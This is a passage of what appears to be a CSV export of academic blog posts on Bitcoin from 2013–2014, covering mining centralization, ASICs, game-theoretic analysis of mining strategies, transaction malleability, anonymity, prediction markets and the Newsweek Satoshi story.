that miners could earn more bitcoins by changing their mining strategy — being met with another kind of game-theoretic argument, one that expands the strategy space to reach a different conclusion. Notice that we’re talking about two very different kinds of strategy here. Mining strategy is executed by software, happens at the time-scale of minutes, and can be analyzed as a “closed” system where the strategy space can be formally described and analyzed mathematically. On the other hand, movements in price and pushing out updates to software involve human decisions, are typically much slower, and are hopeless to try to precisely model mathematically. In other words, we seem to have a nested game, a game within a game. The inner game is played by automated agents according to the way they’re programmed. On the other hand, moves in the outer game consist of human operators changing the agents in response to what’s happening on the block chain as well as making moves that are not available to the automated agents. Many moves in the inner game happen between consecutive moves in the outer game, which is one reason that we’re forced to treat the two levels separately. If we start looking for this nested-game structure, we find it everywhere. Malware and malware-detection mechanisms are in a constant cat-and-mouse game. In this game, malware must make instantaneous decisions such as where to spread next and whether to attack or wait. But both malware and anti-malware tools are under the control of their respective operators who evolve them over time in response to each others’ moves. Similarly, packets are routed instantaneously but routing policy evolves over time based on traffic patterns. My central claim is that for game-theoretic models of Bitcoin mining strategy to better model practice, we must recognize the existence of this two-level structure. The surprising results I talked about in the previous post can all potentially be explained by analyzing the nested game and concluding that it isn’t profitable for miners to deviate after all. Nested games seem to be a popular method for analyzing the behavior of politicians who’re under the influence of voters. It hasn’t been used so far for analyzing Bitcoin. This research direction is likely to yield dividends beyond cryptocurrencies. Computer scientists are mechanism designers, from ad auctions to routing protocols. Any of these situations can be seen as a nested game since the creators of the software that plays these games regularly modify it in response to strategies employed by others. The question of which elements of strategy should be programmed into the machines and which ones left to human judgment is relevant to every such scenario. In the next post, I’ll present a simple illustrative example of how a nested-game analysis of mining strategy can result in an interesting and non-obvious prediction. Specifically, I’ll look at what happens if a fork-and-double-spend inner game strategy is met by an outer game strategy of the developers deciding to kill the forking chain even though it’s longer. Thanks to Joe Bonneau who suggested the nested game formulation."
"392","2014-06-16","2023-03-24","https://freedom-to-tinker.com/2014/06/16/bitcoin-mining-now-dominated-by-one-pool/","The big news in the Bitcoin world, is that one entity, called GHash, seems to be in control of more than half of all of the mining power. A part of Bitcoin’s appeal has been its distributed nature: the idea that no one party is in control but the system operates through the cooperative action of a large community. The worry now is that GHash has too much power and that this could destabilize the Bitcoin system. Today I want to explain what has happened, why it provokes worry, and how I see the situation. Let’s start by reviewing some technical background. Bitcoin relies on a data structure called the “blockchain” which is a kind of digital logbook that records all of the transactions that have occurred within Bitcoin. The blockchain is built by “mining”, a process in which participants (“miners”) compete to find a number that solves a very difficult mathematical equation. Whoever finds a solution first gets to add a block to the blockchain, and they’re rewarded with a payment of 25 Bitcoins, which is currently worth about $15,000. Then a new equation needs to be solved, and the miners race again to make a new block and collect a new 25 Bitcoins. This cycle happens every ten minutes or so. Mining can be viewed as a kind of voting procedure, in which the miners vote on which transactions should be recognized as valid. But rather than one-miner-one-vote, the system gives each miner a voting power that is proportional to that miner’s computing power—how quickly they can test possible solutions to the equation. If one miner has 51% or more of the mining power, then that miner can always win the election and can simply decree which transactions are to be considered valid. This is called a “51% attack.” One way to understand the potential power of a 51% attacker is to consider that they can simply change the rules of Bitcoin at any time. And the changes could in principle be drastic: a “pay me a 5% fee on every transaction” rule, or “a million new Bitcoins exist and belong to me” rule. [UPDATE (16 June 2014): I have gotten some Tweets and emails claiming that the class of attacks available to a 51%-er is much smaller, basically only double-spend attacks. I disagree. See the comments below, including the link posted by Anonymous.] There are two counterarguments that claim that GHash’s 51% control isn’t such a serious problem. The first, which I’ll call the “golden goose” argument, acknowledges that GHash could steal and cheat, but that that would be an irrational move. As soon as GHash starts stealing, people will notice. The public will lose faith in Bitcoin, and the value of Bitcoins will plummet. So the act of stealing will render the fruits of the theft worthless. Besides, destroying the value of Bitcoin will eliminate the $15,000-per-ten-minutes mining rewards, which GHash can collect half of by mining honestly. In this theory, cheating amounts to killing the golden goose. The second counterargument, which I’ll call the “coalition argument”, points out that GHash doesn’t control 51% of mining power directly but instead acts as the coordinator for a “mining pool” consisting of many miners who work at the direction of GHash in exchange for GHash paying them a share of its winnings. In other words, GHash is the leader of a coalition, and its power depends on its ability to hold the coalition together. This isn’t a knockout argument, though, because GHash might try to rake off some Bitcoins from the system, while using some of those coins to pay retention bonuses to coalition members. The economic and social dynamics of this situation are complex and undertheorized, so I don’t think we can say for sure what might happen if GHash goes down that road. Where does this leave us? I don’t think it would be rational for GHash to exercise its power immediately through short-term rule changes or confiscation of others’ coins. But that doesn’t mean that GHash’s 51% control is harmless. Bitcoin is governed by consensus, and the system has responded to past problems by building coalitions behind needed changes. That kind of collective governance becomes more difficult when one entity has the power to try to impose the outcome it wants—or to blow up the system entirely. It’s difficult to negotiate with a guy who is holding a doomsday device—and that’s true even if there’s a fair chance that the device will malfunction. Mao said famously that “Political power grows out of the barrel of a gun.” In Bitcoin politics, power grows out of the exhaust fan of a mining rig. If Bitcoin is going to have stable and functional governance in the long run, it will have to find a way to keep mining power dispersed. Concentration of mining power might not be a short-term disaster, but it is unhealthy for Bitcoin, and the community needs to address it."
"393","2014-12-12","2023-03-24","https://freedom-to-tinker.com/2014/12/12/why-asics-may-be-good-for-bitcoin/","Bitcoin mining is now almost exclusively performed by Bitcoin-specific ASICs (application-specific integrated circuits). These chips are made by a few startup manufacturers and cannot be used for anything else besides mining Bitcoin or closely related cryptocurrencies [1]. Because they are somewhere between a thousand and a million times more efficient at mining Bitcoin than a general-purpose computer that you can buy for the same price, they have quickly become the only game in town. Many have lamented the rise of ASICs, feeling it departs from the democratic “one computer, one vote” vision laid out by Satoshi Nakamoto in the original Bitcoin design. There is also significant concern that mining is now too centralized, driven by ASICs as well as the rise of mining pools. Because of this, there have been many efforts to design “ASIC-resistant” mining puzzles. One of the earliest alternatives to Bitcoin, Litecoin, chose the memory-hard scrypt instead of SHA-256 in the hope of preventing ASIC mining. Despite this, there are now ASICs for mining Litecoin and their speedup over general-purpose computers may be even greater than that of Bitcoin ASICs. Litecoin’s developers themselves have essentially given up on the principle of ASIC-resistance. Subsequent efforts have included X11, which combines eleven hash functions to attempt to make ASICs difficult to build, but it’s probably only a matter of time before X11 ASICs arise as well. It’s been convincingly argued that ASIC-resistance is probably impossible in the long-term, so we should all accept that ASICs are inevitable in a successful cryptocurrency. I would like to expand on the argument here though by positing that ASICs may actually make Bitcoin (and similar cryptocurrencies) more stable by ensuring that miners have a large sunk cost and depend on future mining revenues to recoup it. Even if it were technically possible to design a perfectly ASIC-resistant mining puzzle which ensured that mining was efficient on general-purpose computers, this might be a bad idea if it meant you could obtain a lot of computational capacity and use it in a destructive attack on Bitcoin without significantly devaluing your computational resources’ value. It’s well-known that an entity controlling the majority of mining capacity can undermine Bitcoin. Famously, they could double-spend by intentionally forking the blockchain, although they could also simply reject all other miner’s blocks to collect 100% of mining rewards and/or censor which Bitcoin transactions are published. There are a variety of other possible attacks without any party controlling an absolute majority, such as “selfish mining” by strategic block withholding or feather-forking. It’s also possible a cartel of miners could try to act as a single majority miner. To date, none of these attacks has occurred even though GHash.io surpassed 51% of mining capacity for several weeks in July 2014. The basic theory explaining this failure to attack is that these attacks aren’t the most profitable option available to an entity owning lots of mining capacity. Major attacks would undermine confidence in Bitcoin, tank the exchange rate, and make all the earned Bitcoins much less valuable than what the large miner could have earned by not attacking and simply mining normally. Call this the opportunity cost of attacking argument. Satoshi Nakamoto indeed laid this argument out in the original Bitcoin paper and GHash.io assured the public they wouldn’t attack for basically this reason. In economic terminology, the argument is that any large miner has a large expected future earnings from honest behavior and hence a major attack that threatens those earnings will have a high opportunity cost. A key embedded assumption is that there is no other viable use for their computational capacity and that it is a sunk cost. If we could achieve “perfect” ASIC-resistance, meaning ASICs are no more efficient than equivalently expensive general purpose computers at mining, then a significant portion of this sunk cost would be salvageable and attacking might become a much more attractive option. For example, you could buy a few million computers to mine Bitcoin, perform a one-time attack, and then sell the computers for use in grid computing. Even worse, one might simply rent capacity from a general-purpose cloud-computing service (such as Amazon web services) to perform an attack. By contrast, if we achieved “perfect” ASIC-friendliness we could ensure Bitcoin mining hardware is a complete sunk cost and maximize the opportunity cost of attacking. There are some limits as the hardware will always have some minimal salvage value simply for raw materials. But we could design a function that was essentially impossible to perform efficiently in software and has no other known purpose. The design of DES actually points to a few tricks for achieving this-we might design SHA-256’ for use in mining by adding some software-killing bitwise permutations and tweaking the constants to ensure it isn’t the same SHA-256 used anywhere else (e.g. for password hashing). A formal treatment of the “opportunity cost of attacking” argument for Bitcoin remains an open challenge. It’s not proven to hold even in the case of a relatively ASIC-friendly puzzle like SHA-256. But it appears that ASIC-resistance might undermine this key argument for why rational actors shouldn’t attempt many types of attacks on Bitcoin. This post came from a discussion in Princeton’s new Bitcoin class. Thanks to Akis Kattis in particular for asking questions on this issue as well as to Arvind Narayanan and Ed Felten for reviewing this post. [1] It’s theoretically possible you could re-purpose some Bitcoin mining ASICs to perform other SHA-256 brute-force tasks such as password cracking. To my knowledge nobody has successfully done this and current mining ASICs could not be made to do so. Perhaps you could redesign a mining ASIC which could also be used for password brute-force, but there are major challenges (the simplest of which is the data bus would need to have much higher bandwidth to transfer all of the password guesses to the ASIC)."
"394","2014-06-19","2023-03-24","https://freedom-to-tinker.com/2014/06/19/on-decentralizing-prediction-markets-and-order-books/","In a new paper to be presented next week at WEIS by Jeremy Clark, we discuss the challenges in designing truly decentralized prediction markets and order books. Prediction markets allow market participants to trade shares in future events (such as “Will the USA advance to the knockout stage of the 2014 World Cup?”) and turn a profit from accurate predictions. Prediction markets have undergone extensive study by economists and have significant social value by providing accurate forecasts of future events. Prediction markets have been traditionally run by centralized entities that holds all of their users’ funds and shares in escrow, don’t generally allow trades to be routed through different exchange services, and make many important decisions: which events to open a market for, what the correct outcome is, and how to match buyers with sellers. Our work examines the extent to which these tasks can be decentralized to reduce trust in single entities and increase transparency, fault-tolerance, and flexibility. Bitcoin’s success as a decentralized ledger of financial transactions suggests a decentralized prediction market may be within reach. First, we should be clear what we didn’t set out to do in our paper: build a functioning decentralized prediction market or even provide a single concrete design. Our goal was to enumerate the space of possibilities and identify the main challenges and potential solutions. We hope this work will be valuable for anybody implementing a decentralized prediction market. Second, our goal was a strictly decentralized market. Many proposals exist for “Bitcoin-based prediction markets” in various guises, but many (such as Predictous) simply use Bitcoin as a currency for a centralized prediction market. This approach may have merit, but it wasn’t our design goal. The most basic aspect of a decentralized prediction market is an automated service for clearing and settlement (often referred to as straight-through processing). Our design starts from a Bitcoin-like currency (an altcoin) and builds into it the notions of markets, shares in those markets, and ownership and transfer of those shares. Shares are similar to units of the underlying currency in the way they can be traded through the block chain, but are tied to a specific market and one of the possible outcomes of that market. Any participant can unilaterally buy a complete set of shares in any open market at any time for a fixed price. If she finds a counterparty, she can trade any amount of her shares for an agreed-upon price (denominated in the underlying currency). A complete set of shares may also be redeemed at any point in time for the same fixed price to acquire new shares, enabling participants to profit from changing prices prior to a market closing. The first key problem in a decentralized prediction market is arbitration. How do we securely input the fact that the Seahawks won Super Bowl XLIX into a decentralized digital system? This problem inherently requires a human in the loop and is security-critical, since parties (such as those who incorrectly predicted the Broncos to win) may have a significant financial incentive to enter incorrect information from “reality’’. [1] We outline three basic approaches for arbitration: voting by miners in a Bitcoin-like block chain, voting by market participants, or assertion by a designated arbiter. Voting by either miners or market participants is tricky but by carefully designing the rules we can incentivize parties to vote correctly. For example, voters can suffer a financial penalty if they vote differently than the majority, encouraging consensus. Assertion by an arbiter, by contrast, is relatively straightforward and efficient but carries the risk of arbiter misbehavior. We can mitigate this risk by allowing arbiters to build a reputation over time for honest behavior and earn a small profit for their services, incentivizing honest behavior to protect future expected revenue. A second key challenge is building an order book to match potential buyers and sellers of prediction shares. This can be performed as a centralized service, but the book maker can misbehave in several ways by blocking or re-ordering orders to prioritize their own trades. Similar to using semi-trusted arbiters, we can allow users to choose a third-party exchange to place bids and asks with and hope honest exchanges will emerge based on reputational incentives. However, operating an exchange is far more complicated than arbitrating an event—declaring an outcome only requires sending one signed transaction. We offer a novel approach where miners run a call market: any participant can broadcast bid or ask offers to the network, miners run a simple algorithm to match pairs and they publish them in a block. Our key insight is to allow miners to retain the entire spread as a transaction fee. This removes the incentive for any misbehavior by miners and provides an elegant way to incentivize miners to perform this function. This functionality can easily co-exist alongside the possibility of using third-party (off block chain) order books with users choosing where to submit their offers. There are many other design decisions for a decentralized prediction market. We believe we’ve provided both a good template, in the set of transactions we propose a decentralized prediction market should support, as well as a useful breakdown of the challenges in arbitration and order book construction. We also discuss several possible ways a decentralized prediction market might be built-as an altcoin (possibly with convertibility from Bitcoin via proof-of-burn), as an overlay to Bitcoin, or “natively” in Bitcoin via extensions to the protocol. As noted, this was an academic effort and we have no plans to implement a concrete system. Hopefully we’ve provided a good framework to analyze proposals which incorporate some of these ideas in various guises, such as Reality Keys or Counterparty. One major lesson from our research is that a number of design choices appear to be similar or identical in theory, but we expect in practice there will be important differences in what market characteristics these design choices lead to. We’ll be curiously watching this space. This was joint work with Jeremy Clark (Concordia University), Ed Felten, Joshua Kroll, Andrew Miller (University of Maryland), and Arvind Narayanan. [1] We aren’t even considering here the challenge of events with a legitimate real-world dispute over the outcome, such as 2012 Iowa Republican caucuses."
"395","2014-05-07","2023-03-24","https://freedom-to-tinker.com/2014/05/07/the-importance-of-anonymous-cryptocurrencies/","Recently I was part of a collaboration on Mixcoin, a set of proposals for improving Bitcoin’s anonymity. A natural question to ask is: why do this research? Before I address that, an even more basic question is whether or not Bitcoin is already anonymous. You may have seen back-and-forth arguments on this question. So which is it? An analogy with Internet anonymity is useful. The Bitcoin protocol doesn’t require users to provide identities, just like the Internet Protocol doesn’t. This is what people usually mean when they say Bitcoin is anonymous. But that statement by itself tells us little. A meaningful answer cannot be found at the protocol level, but by analyzing the ecosystem of services that develop around the protocol. [*] Continuing the analogy, the meme in the early 90s was, “on the Internet, nobody knows you’re a dog.” But that changed quickly once e-commerce and advertising began to provide an incentive for pervasive tracking and data mining. Bitcoin anonymity today is where Internet and web anonymity was in the 90s — a variety of research papers have shown how users’ pseudonymous Bitcoin addresses can be linked to each other and potentially to their real-world identities, but it remains to be seen if linking/tracking services will develop and flourish. It would be entirely unsurprising if they did. This is where the public nature of the block chain becomes salient: in a hypothetical world where Bitcoin is commonly used for everyday transactions and deanonymization happens as a matter of course, users will have much less privacy than with cash or credit cards. At least in today’s world your transactions are only exposed to merchants, banks, and any intermediaries, whereas we’re talking about a scenario where they’d be exposed publicly, permanently, and irreversibly. I see research on anonymity technologies for cryptocurrencies as a hedge against this possibility. Having at least an existence proof of stronger privacy technologies for Bitcoin — whether Altcoins or mixing-based — is important for driving confidence in mainstream adoption of Bitcoin. To what extent these technologies should be deployed today is a question best left for another post. [*] Reaching conclusions about the Bitcoin ecosystem by looking at the Bitcoin protocol seems to be a recurring fallacy: see my previous post The low-transaction-fee argument for Bitcoin is silly."
"396","2014-03-11","2023-03-24","https://freedom-to-tinker.com/2014/03/11/why-dorian-nakamoto-probably-isnt-satoshi/","When Newsweek published its cover story last week claiming to have identified the creator of Bitcoin, I tweeted that I was reserving judgment on their claim, pending more evidence. At this point it looks like they don’t have more evidence to show us—and that Newsweek is probably wrong. Bitcoin’s founder called himself “Satoshi Nakamoto” and is commonly called simply “Satoshi.” Most people believe the founder chose this pseudonym to hide his/her/their identity. Newsweek claims instead that a California engineer named Dorian Prentice Satoshi Nakamoto is Satoshi. Dorian’s birth name was Satoshi Nakamoto but he legally changed his name to Dorian in 1973. (For clarity, I’ll call him “Dorian”, and I’ll use “Satoshi” to refer to the Bitcoin founder, so that the question at hand is whether Dorian and Satoshi are the same person.) Felix Salmon, who has some of the best commentary on the Dorian/Satoshi matter, points out that Newsweek’s claim is almost universally disbelieved in the technical community. Part of the reason is the perception that Newsweek’s evidence is thin, and people in the tech community aren’t inclined to defer to the institutional reputation of Newsweek. Another reason is that the Newsweek piece is craftily written to give the impression that the evidence is stronger than it is. This starts from the first two words of the piece, which refer to Dorian as “Satoshi Nakamoto”. Only later is it made clear that that is not actually the man’s name, and hasn’t been his name at any point in the relevant period. Newsweek even says that his “name really is Satoshi Nakamoto”—which is not true. Newsweek wants us to believe that Dorian decided to sign the Bitcoin paper with his birth name rather than the name he had been using for 35 years. There’s no explanation as to why he would have used his birth name on the Bitcoin paper. The followup comments from Newsweek’s team don’t give much confidence either. For example, Salmon quotes Newsweek editor Jim Impoco as saying “we eliminated every other possible person.” That can’t possibly be true, or even close to true. And it’s not the only time Newsweek people have fallen back on an argument that they couldn’t rule out Dorian, which is far short of saying that they have positive evidence that Dorian is Satoshi. To me, one of the weakest points in Newsweek’s argument is their assertion that Dorian had the skills and background to create Bitcoin. All they really have as evidence is that Dorian trained as a physicist, worked as an engineer, and is reputed to be very intelligent. But none of that indicates that Dorian understood cryptography or distributed algorithms well enough to devise Bitcoin and write the original Bitcoin paper. The real Satoshi was obviously conversant with crypto—the Bitcoin design shows it, and the fluency of the crypto discussion in the paper tells us that Satoshi was well acquainted with the jargon and literature of the field. Newsweek doesn’t offer any evidence that Dorian knew crypto. Imagine you’re trying to track down the author of a novel written in fluent Hungarian. Somebody points to a possible author who is a talented writer and speaks several languages. One of the first questions you’ll ask is whether this candidate author knows Hungarian—especially when there are several known Hungarian speakers who are already suspected as possible authors. Newsweek’s failure to ask such obvious questions—or their decision to plunge ahead despite not getting useful answers—is at the core of technologists’ skepticism about the story. If they didn’t think to ask whether Dorian knew crypto, then they were probably in over their heads technically which throws other aspects of their analysis into doubt. If they did ask, didn’t find answers they liked, and wrote the piece anyway without mentioning the missing evidence, then they are confirming the impression that their decision to publish was driven more by a desire for page-views than by the strength of the story. It’s not too late for Newsweek, or somebody else, to show up with evidence tying Dorian to Satoshi. But unless that evidence does turn up, I will continue to believe that Dorian Nakamoto is not the creator of Bitcoin."
"397","2014-02-13","2023-03-24","https://freedom-to-tinker.com/2014/02/13/are-user-identification-networks-the-future-of-commercial-bitcoin-transactions/","With 12.3 million bitcoins mined to date, the total value of bitcoins has reached $9.975 billion US dollars. While this may pale in comparison to the $1.23 trillion US dollars in circulation, the use of bitcoins in commerce is gaining traction. With this traction the potential exists to link users’ identities with their public bitcoin wallet addresses and commercial transaction histories. Earlier this year Overstock.com announced that it would begin accepting bitcoins as payment for consumer purchases. The company’s announcement makes Overstock.com the first major US online retailer to accept bitcoins, albeit via a third-party payment processor. Prior to this announcement, a patchwork of smaller online vendors and brick-and-mortar stores had already begun accepting bitcoins. Using bitcoins, individuals are now able to order food for delivery, engage in online dating , and purchase everything from babyfood to videogame consoles. As bitcoins enter the stream of commerce, we should all consider the privacy implications associated with the use of bitcoins in commercial transactions. Every bitcoin and bitcoin transaction is recorded on a public ledger, commonly referred to a block chain. While each bitcoin and bitcoin wallet address is only identified by a string of characters, anyone with knowledge of a particular bitcoin string or wallet address can trace the entire transaction history of that particular bitcoin or wallet address. In fact, we now have a number of real world examples where bitcoins have been traced their ultimate owner, most famously, the FBI’s identification and arrest of Silk Road’s “Dread Pirate Roberts.” In the context of privacy and commerce, unique bitcoin address identifiers and unique ad network identifiers share many of the qualities that purport to offer an anonymous user experience. Analytics companies operate by aggregating visitor information across websites, via unique identifiers. Therefore, if an individual visits Company Websites 1, 2, and 3 –assuming each website has a contractual relationship with the analytics company– the analytics company might tag each consumer visit with the same unique ID number. Without the unique ID number, the analytics company might not be able to determine that the same individual visited each of the three websites. In exchange for access to uniquely tag users on a company’s website, an analytics company might offer each website information about their users. In this manner both the analytics company and the websites gain insight about people as they browse the internet. Using the third-party network example, bitcoins operate both as the unique identifier AND the third-party network. A person’s bitcoin wallet contains a public ledger that allows anyone to identify the exact bitcoins contained in each wallet. As people spend the bitcoins in their wallet, it is possible to view the history of each transaction in real-time. Until recently, the public nature of the block chain has not raised many privacy concerns since the identities of the parties on either side of any given transaction are not publicly known. Thus, while it’s possible to follow the physical money trail, it is substantially more difficult to determine the identity of the money holders. However, consider a common online purchase of a commercial good using bitcoins: in order to process a transaction and send a good to the buyer, the buyer must pay with a bitcoin from her bitcoin wallet. In most instances the buyer would provide her name and address in order for the good to be delivered. She might also provide an e-mail address to receive an electronic receipt or confirm acceptance of payment and delivery. To offer a modicum of privacy, the company might provide the buyer with a one-time bitcoin wallet address for her to send her money to. This decreases the likelihood of people discovering all the transactions that take place through the company. However, without a privacy-protecting measure on the buyer’s side, the company is now able, if it so chooses, to associate the buyer’s identity with her bitcoin wallet address. In isolation, knowing the identity of a buyer and her bitcoin address may not pose significant privacy concerns since a company would still not know the identity of the other sellers that the buyer transacts business with. However, the possibility exists that businesses might create “bitcoin identification networks” modeled after our current third-party ad networks. Were companies to begin sharing “de-identified,” “non-personally identifiable” bitcoin wallet addresses with each other, they would effectively have access to people’s complete purchase histories. A few tools exist that may address the consumer-side privacy concerns. Many of those tools require bitcoin holders to deposit their bitcoins into a third-party account for their bitcoins to be traded or “tumbled” for new bitcoins that are disassociated with their wallets and transactions. However, since bitcoin transactions are irreversible, tumbling tools necessarily rely on blind trust that the third-party tumbler will not abscond with their money. It also remains to be seen whether such tools gain broad scale adoption or whether they would even be effective in protecting privacy were a bitcoin identification network actually created. Prior to entering into commercial transactions using bitcoins, buyers might first consider the effectiveness of their existing privacy tools and the impact their transactions may have on disclosing their purchasing histories in the future. *The views expressed in this article are my own and do not necessarily reflect those of the Federal Trade Commission."
"398","2014-02-12","2023-03-24","https://freedom-to-tinker.com/2014/02/12/understanding-bitcoins-transaction-malleability-problem/","In recent days, several Bitcoin exchanges have suspended certain kinds of payments due to “transaction malleability” issues. There has been a lot of talk about why this happened, and some finger-pointing. In this post, I will try to unpack what “transaction malleability” is and why it has proven to be a problem for some companies. To understand the issue, we need to talk about two core concepts of Bitcoin: transactions and the public ledger. A transaction is like a (paper) check. A simple transaction might say that Account A hereby pays X number of Bitcoins to Account B. This must be (digitally) signed by the owner of Account A. If the transaction is properly signed by Account A’s owner, and if Account A actually owns the coins that it says it is spending, then the transaction is well-formed. The transaction also has a “transaction ID” which serves to identify the transaction, like a check number. (Bitcoin actually supports more complex transactions, for example with multiple payers and multiple recipients, but that doesn’t matter for us here, so let’s stick to the simple, check-like transactions.) The other core concept is the public ledger. This is a single, public, consensus data structure that records every transaction that has ever happened in the Bitcoin system. In order for a transaction to be real, it must be put into the public ledger—if it’s not in the public ledger then it didn’t happen. The public ledger is maintained by Bitcoin miners. For our purposes today all that matters is that miners are the people who add things to the public ledger. If you have a well-formed transaction and you want it to appear in the public ledger, you send that transaction to the miners. Typically your transaction will appear in the public ledger within about ten minutes. Once your transaction is confirmed as being in the public ledger, you know that the funds have officially been transferred, and you can move on. (Of course, all of these things—transactions, signatures, and the public ledger—are fully digital and are defined using cryptography and distributed algorithms, which is what makes Bitcoin different from ordinary checks and bank accounts.) Once Account A has digitally signed our example transaction, cryptography ensures that any attempt to alter the important details of the transaction, such as the payer, recipient, or amount, will be detectable. Any alterations to these important aspects of the transactions will necessarily invalidate the digital signature so that the modified transaction is no longer well-formed and will therefore be rejected. This is an important safeguard that prevents tampering with already-signed transactions. It has been known since roughly 2011 that signed transactions are slightly “malleable” in the sense that it is possible to modify a signed transaction in certain minor ways, without invalidating the signature. The critical details about payment—who is paying how much, and to whom—can’t be changed, but certain peripheral information can be modified in a way that causes the transaction ID to change. [Technical detail for crypto nerds: This happens because the transaction ID is computed by hashing a set of fields that is a superset of the fields covered by the signature.] Now consider what happens to our example payment if, when Account A sends the signed transaction to the miners, the transaction is modified in transit so that the transaction ID changes. The modified transaction will show up in the public ledger, so A’s coins will be transferred to B as authorized. So what’s the problem? Perhaps A is watching the public ledger, watching for the expected transaction ID to show up. The payment will go through, but A will never see the transaction ID it is waiting for. The payment happened, but A thinks it didn’t happen. This could be a problem, depending on how A reacts. Perhaps A will decide that the payment must have failed, leading A to re-do the payment—then B gets paid twice, and Bitcoin transactions are not reversible. Or perhaps A doesn’t double-pay but the mismatch causes A’s accounting system to get confused—so that the books balance but the payments in the public ledger don’t match up with the payments A thinks it has made. For a long time this issue was mostly theoretical, but there has been a recent surge of transaction modification, causing trouble for MtGox and some other Bitcoin businesses. Who is at fault? On the one hand, you can argue that malleability has been a known issue since 2011 and companies should have known to be watching for the non-malleable payment details of a transaction to show up, rather than waiting for the transaction ID to show up. If you’re not doing this, your system is buggy and it’s your own fault. Or so this argument goes. On the other hand, watching for a transaction ID is an easy mistake to make, and it is kind of odd to call something a transaction ID when it can be changed. This is certainly a rough edge in the Bitcoin design, which could have been avoided and will likely be fixed in the future. This was an avoidable error by the Bitcoin designers. Or so this argument goes. Both arguments have some merit. The bottom line is that these problem could have been prevented either by the Bitcoin designers or by the authors of the affected software. This is an important reminder that relying on new, complex technologies carries risks, and it pays to be extra careful to engineer the details of your technology correctly."
"399","2013-11-11","2023-03-24","https://freedom-to-tinker.com/2013/11/11/game-theory-and-bitcoin/","In light of the back-and-forth about the recent Eyal and Sirer (“ES”) paper about Bitcoin mining, I want to take a step back and talk about what a careful analysis of Bitcoin mining dynamics would look like. (Here are some previous posts if you need backstory: 1 2 3 4 5.) The key to a sound analysis of situations like this is to use game theory, a well established set of intellectual tools for thinking about strategic behavior in adversarial settings. The ES paper makes two main claims that use language from game theory. First, they claim that their “selfish” strategy dominates the default “honest” Bitcoin mining strategy. Second, they claim that Bitcoin is not incentive compatible. To understand why reasoning about games can be nonintuitive, consider the simple two-player game of rock-paper-scissors. A player, observing that rock wins against scissors, might think this implies that a rational player should always play rock or should never play scissors. Both conclusions are incorrect—in fact, a player who always plays rock will lose in the long run, as will a player who never plays scissors. The fallacy here is thinking that if A wins against B, this implies that A is a better strategy than B. Game theory gets this right, capturing the informal concept of better strategy with a concept of domination that is defined so that A dominates B means that (1) there are situations where A is a better choice than B, and (2) no matter what the other players do, A is never a worse choice than B. Rock does not dominate scissors because although condition (1) is true, condition (2) is not true: when the other player chooses paper, rock is not a better choice than scissors. The ES authors commit this fallacy when they say “we have shown that selfish mining dominates the honest Bitcoin protocol”. What their paper actually argues is that “selfish” wins against “honest”—which implies part (1) of the definition of dominates. They don’t try to show that part (2) is true—and part (2) is clearly not true because a small miner is better off being honest when everybody else is being honest. So the first main claim of the ES paper—that “selfish” mining dominates honest Bitcoin mining—is incorrect. The second important tool of game theory, which will speak to the second ES claim, is the concept of Nash equilibrium. This deals with the “What will he think I am thinking about what he thinks I am planning” difficulty in reasoning about complex games. Essentially, a Nash equilibrium is a situation in which, if all players’ strategies become known, no player wants to change their strategy in response to what the others are doing. A famous theorem showed that at least one equilibrium always exists in games like these. In rock-paper-scissors, there is a unique Nash equilibrium in which each player randomly chooses their move, with each possible move being chosen with equal probability. In general, games can have multiple equilibria. (There is a body of theory that classifies equilibria and considers some more worthy than others; but that doesn’t really matter for us here.) When the ES paper claims to have shown Bitcoin to be not incentive compatible, it’s not exactly clear what they mean. Three possibilities seem plausible. (1) There is no equilibrium in which all miners behave honestly. (2) There is an equilibrium in which some miners deviate from the honest protocol. (3) There is an equilibrium in which in ordinary users of Bitcoin cannot get transactions done. The ES paper doesn’t seem to talk about equilibria, and its arguments don’t seem to come near to any of the three possible definitions. For what it’s worth, Josh Kroll, Ian Davey, and I previously published a paper discussing equilibria in Bitcoin mining. We showed that there is an equilibrium in which all miners follow the standard honest protocol. We also showed that there are infinitely many other equilibria in which all miners behave identically to enforce a different set of “Bitcoin rules”. So in the model we used, we showed that definition (1) is not satisfied but definition (2) is satisfied. Our results don’t speak to definition (3). But our model of the mining game differs from the ES paper’s model, so our results don’t carry over completely to their model. In the case where no individual miner controls more than 33.3% of mining power, our results do carry over to the ES paper’s model. And when one miner controls more than 50% of mining power, everyone agrees on what will happen. So the open question, which our work (in a different model) doesn’t extrapolate to cover, and which the ES paper doesn’t address either, seem to be this: in the case where there is a miner controlling more than 33.3% of mining power but less than 50%, is there still an equilibrium in which all miners are honest? More research would be required to answer this question. But the most important question about the dynamics of Bitcoin mining, which nobody has yet answered, is whether there is an equilibrium that can actually occur in which the Bitcoin economy can no longer function. This is the question that everyone would like to answer. Here’s the bottom line on the ES paper, as I see it. The ES paper has provided value by describing and characterizing a strategy in which miners or pools withhold mined blocks in order to try to gain an advantage. This starts a useful conversation. But their bold claims about dominant strategies and incentive incompatibility are unsupported and sometimes incorrect. More progress will have to be made before we can understand what role if any the new mining strategies might play in practice."
"400","2013-02-05","2023-03-24","https://freedom-to-tinker.com/2013/02/05/basic-economics-of-bitcoin-mining/","Arvind wrote yesterday about the availability of chips that do super-fast Bitcoin mining. I want to follow up by unpacking the economics of Bitcoin mining, to see what the effect of the new chips will be, and more generally what the future of Bitcoin mining looks like. For those unfamiliar with Bitcoin, here is a one-paragraph summary: Bitcoin is a digital currency that operates without any centralized issuer. It’s a “real” currency, in the sense that it can be converted readily into traditional currencies such as dollars. Logically, a Bitcoin has a serial number. You can give a coin to someone by adding an entry to the global Bitcoin log, saying that you gave them that coin. The clever part of Bitcoin’s design is how the global log works. The log consists of a chain of “blocks,” each memorializing a bunch of transactions. To create a new block, you have to solve a difficult cryptographic puzzle which can only be done by randomly trying guesses until you find one that works. If you are the first person to solve a puzzle, you can create a new block in the log–and you are allowed to add to the block a special event that gives you a newly minted coin. Once somebody solves a puzzle and creates a block, a new puzzle-solving race begins. The activity of trying to solve puzzles, in order to create new blocks, in order to get the new coins that go to block creators, is called “mining”. Mining is optional: you can receive and spend Bitcoins without doing any mining. Increasingly, mining is a specialized activity. The economics of mining are interesting. Suppose you are thinking about devoting resources to mining. Let’s assume it will cost you C dollars per second to mine (for equipment and electricity), and you will be able to try P puzzle guesses per second. Every time you solve a puzzle you will get a Bitcoin whose value in dollars is V. Is mining profitable? The answer depends on how many guesses it takes to solve a puzzle. If it takes G guesses to solve a puzzle on average, then you will solve P/G puzzles per second, earning PV/G dollars per second. If this is greater than your cost C, then you will mine. Solving for G, we see that mining is profitable if G < PV/C. But what is G in real life? How hard are the 